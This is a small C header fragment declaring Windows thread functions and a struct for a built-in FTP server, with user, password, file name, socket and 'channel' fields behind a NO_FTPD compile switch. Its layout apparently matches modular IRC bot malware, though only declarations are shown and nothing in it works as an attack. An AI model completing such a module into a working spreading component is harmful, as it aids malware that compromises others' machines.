

#ifndef NO_FTPD
DWORD WINAPI ftpd(LPVOID param);
bool ftpd_datatransfer(SOCKET dsock, char szIP, int iPort);
DWORD WINAPI ftpd_handler(LPVOID param);
bool ftpd_request(SOCKET bsock, char *szIP, int iPort);

typedef struct ftp
{
	int iPort;
	char szUser[32];
	char szPass[32];
	char szFileName[32];
	SOCKET consock;
	SOCKET bsock;
	char szAction[32];
	char szChannel[32];
} ftp;
#endif